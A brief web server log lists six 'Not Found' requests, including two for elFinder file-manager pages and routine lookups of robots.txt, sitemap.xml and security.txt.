Not Found: /uploads/assets/backend/elfinder/elfinder.html
Not Found: /uploads/elfinder/elfinder-cke.html
Not Found: /robots.txt
Not Found: /sitemap.xml
Not Found: /.well-known/security.txt
Not Found: /robots.txt
